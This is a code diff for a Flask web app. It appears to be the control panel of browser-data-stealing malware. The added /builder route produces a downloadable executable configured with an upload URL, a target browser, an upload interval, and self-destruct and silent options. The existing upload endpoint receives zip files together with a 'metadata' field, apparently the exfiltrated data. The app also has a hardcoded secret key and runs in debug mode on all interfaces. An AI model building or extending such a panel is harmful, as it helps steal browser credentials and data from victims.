@@ -2,7 +2,7 @@ from flask import Flask, render_template, request, send_from_directory, flash, r
 import os
 import zipfile
 import shutil
-from builder import check_mingw, generate_config_h, compile_program
+from builder import build_executable
 
 app = Flask(__name__)
 app.secret_key = "supersecretkey"
@@ -11,11 +11,13 @@ app.secret_key = "supersecretkey"
 UPLOAD_FOLDER = "uploads"
 UNZIPPED_FOLDER = "unzipped"
 STATIC_FOLDER = "static"
+BUILD_FOLDER = os.path.join(STATIC_FOLDER, "builds")
 
 # Ensure directories exist
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 os.makedirs(UNZIPPED_FOLDER, exist_ok=True)
 os.makedirs(STATIC_FOLDER, exist_ok=True)
+os.makedirs(BUILD_FOLDER, exist_ok=True)
 
 @app.route("/")
 def index():
@@ -32,14 +34,13 @@ def uploads():
     
     return render_template("uploads.html", zip_files=zip_files, unzipped_files=unzipped_files)
 
-
 @app.route("/file_upload", methods=["POST"])
 def file_upload():
-    if "file" not in request.files or "json" not in request.form:
+    if "file" not in request.files or "metadata" not in request.form:
         return {"error": "Missing file or JSON payload"}, 400
 
     file = request.files["file"]
-    json_data = request.form["json"]
+    json_data = request.form["metadata"]
 
     if file.filename == "":
         return {"error": "No file selected"}, 400
@@ -64,10 +65,36 @@ def file_upload():
 
     return {"error": "Invalid file type"}, 400
 
-
 @app.route("/files/<path:filename>")
 def serve_file(filename):
     return send_from_directory(STATIC_FOLDER, filename)
+
+@app.route("/builder", methods=["GET", "POST"])
+def builder():
+    if request.method == "POST":
+        upload_url = request.form.get("upload_url")
+        target_browser = int(request.form.get("target_browser"))
+        upload_interval = int(request.form.get("upload_interval"))
+        self_destruct = "self_destruct" in request.form
+        silent = "silent" in request.form
+
+        success, result = build_executable(
+            upload_url=upload_url,
+            target_browser=target_browser,
+            upload_interval=upload_interval,
+            self_destruct=self_destruct,
+            silent=silent,
+            output_dir=BUILD_FOLDER
+        )
+
+        if success:
+            flash("Executable built successfully!", "success")
+            return send_from_directory(BUILD_FOLDER, os.path.basename(result), as_attachment=True)
+        else:
+            flash(f"Build failed: {result}", "error")
+            return redirect(url_for("builder"))
+
+    return render_template("builder.html")
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
